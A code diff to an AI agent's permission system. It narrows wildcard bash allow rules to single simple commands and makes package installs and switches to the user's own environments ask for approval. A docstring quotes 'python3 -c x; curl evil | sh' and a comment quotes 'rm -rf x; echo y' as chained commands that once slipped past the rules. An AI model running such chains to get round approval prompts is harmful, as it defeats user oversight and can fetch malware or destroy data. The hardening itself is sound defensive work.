@@ -131,6 +131,75 @@ def perm_match(text: str, pattern: str) -> bool:
         return False
 
 
+#: Shell control characters that join, redirect or group commands when they
+#: appear outside quotes.
+_SHELL_CONTROL = frozenset(";&|<>()\n\r")
+
+
+def bash_command_is_simple(command: str) -> bool:
+    """True when ``command`` is one plain shell command.
+
+    Quote-aware: ``python3 -c "import a; print(a)"`` is one command (the
+    ``;`` is inside quotes) while ``python3 -c x; rm y`` is two. A command
+    separator, pipe, redirect, background ``&`` or subshell outside quotes, a
+    command substitution (backtick or ``$(``) outside single quotes, or an
+    unbalanced quote makes it not simple. A backslash escapes the next
+    character, as the shell reads it.
+    """
+
+    text = command or ""
+    if not text.strip():
+        return False
+    quote = ""
+    index = 0
+    while index < len(text):
+        char = text[index]
+        if quote == "'":
+            if char == "'":
+                quote = ""
+            index += 1
+            continue
+        if char == "\\":
+            index += 2
+            continue
+        if char == "`" or (char == "$" and text[index + 1 : index + 2] == "("):
+            return False
+        if quote == '"':
+            if char == '"':
+                quote = ""
+        elif char in ("'", '"'):
+            quote = char
+        elif char in _SHELL_CONTROL:
+            return False
+        index += 1
+    return quote == ""
+
+
+def _is_literal_pattern(pattern: str) -> bool:
+    """A pattern with no wildcard of its own (``[*]``-style classes are literal)."""
+
+    return not _GLOB_METACHARACTERS.search(re.sub(r"\[[*?\[]\]", "", pattern or ""))
+
+
+def _rule_widens_compound_bash(tool: str, target: str, pattern: str) -> bool:
+    """A wildcard bash rule may stand for one plain command, never a chain.
+
+    ``*`` in a rule spans shell metacharacters, so ``python3 -c *`` -- the
+    prefix the approval card offers -- also matched ``python3 -c x; curl evil
+    | sh``. A wildcard rule (other than the explicit allow-everything ``*``)
+    therefore covers only a target that is a single simple command; a
+    compound one matches only a rule that spells it out exactly.
+    """
+
+    return (
+        tool == "bash"
+        and pattern not in ("*", "")
+        and target != pattern
+        and not _is_literal_pattern(pattern)
+        and not bash_command_is_simple(target)
+    )
+
+
 _GLOB_METACHARACTERS = re.compile(r"[*?\[]")
 
 
@@ -167,7 +236,14 @@ DEFAULT_PERMISSION_RULES = (
     ("project_import_file", "*", "allow"),
     ("save_artifact", "*", "allow"),
     ("delegate", "*", "allow"),
-    ("env_setup", "*", "allow"),
+    # Installing packages changes an interpreter the user owns (the session's
+    # kernel environment). It used to be allowed silently and wrote into the
+    # daemon's own venv; every install is now the user's call.
+    ("env_setup", "*", "ask"),
+    # Switching the kernel: OpenAI4S's own environments freely, the user's own
+    # conda environments ("local") only with their approval.
+    ("env_use", "builtin:*", "allow"),
+    ("env_use", "local:*", "ask"),
     ("web_fetch", "*", "allow"),
     ("web_search", "*", "allow"),
     ("science_search", "*", "allow"),
@@ -205,7 +281,7 @@ DEFAULT_PERMISSION_RULES = (
 # Version 5 is skipped on purpose: a parallel branch claims it, and a database
 # already seeded to 5 by that branch would otherwise never add these rules.
 # Gaps are harmless; seeding reads ``ADDITIONS.get(version, ())``.
-_DEFAULT_PERMISSION_RULE_VERSION = 6
+_DEFAULT_PERMISSION_RULE_VERSION = 7
 _DEFAULT_PERMISSION_RULE_ADDITIONS = {
     2: (("science_search", "*", "allow"),),
     3: (("mcp_call", "volcengine-datapro/dataPro_search", "allow"),),
@@ -215,6 +291,10 @@ _DEFAULT_PERMISSION_RULE_ADDITIONS = {
         ("project_glob", "*", "allow"),
         ("project_grep", "*", "allow"),
         ("project_import_file", "*", "allow"),
+    ),
+    7: (
+        ("env_use", "builtin:*", "allow"),
+        ("env_use", "local:*", "ask"),
     ),
 }
 
@@ -227,6 +307,10 @@ _DEFAULT_PERMISSION_RULE_ADDITIONS = {
 # an allow after upgrade; deny/ask and deleted rows are preserved.
 _DEFAULT_PERMISSION_RULE_REPLACEMENTS = {
     4: (("skills_edit", "*", "allow", "ask"),),
+    # v7: the shipped ``env_setup * allow`` let the agent install packages
+    # without asking (and, before the same release, into the daemon's venv). An
+    # operator who deliberately wants silent installs can restore the allow.
+    7: (("env_setup", "*", "allow", "ask"),),
 }
 
 
@@ -379,6 +463,13 @@ class PermissionRuleRepository:
                 continue
             if rule["decision"] == "deny":
                 return "deny"
+            # Only a rule that grants is narrowed to simple commands. A wildcard
+            # `ask` rule still covers a chain: skipping it let a broad allow
+            # (`*`) win for `rm -rf x; echo y` over the user's `rm *` -> ask.
+            if rule["decision"] == "allow" and _rule_widens_compound_bash(
+                tool, pattern_input or "", rule_pattern
+            ):
+                continue
             key = (
                 0 if rule_tool in ("*", "") else 1,
                 0 if rule_pattern in ("*", "") else 1,
@@ -1022,6 +1113,7 @@ class PermissionRuleRepository:
 
 
 __all__ = [
+    "bash_command_is_simple",
     "canonical_permission_action_digest",
     "DEFAULT_PERMISSION_RULES",
     "permission_action_digest",
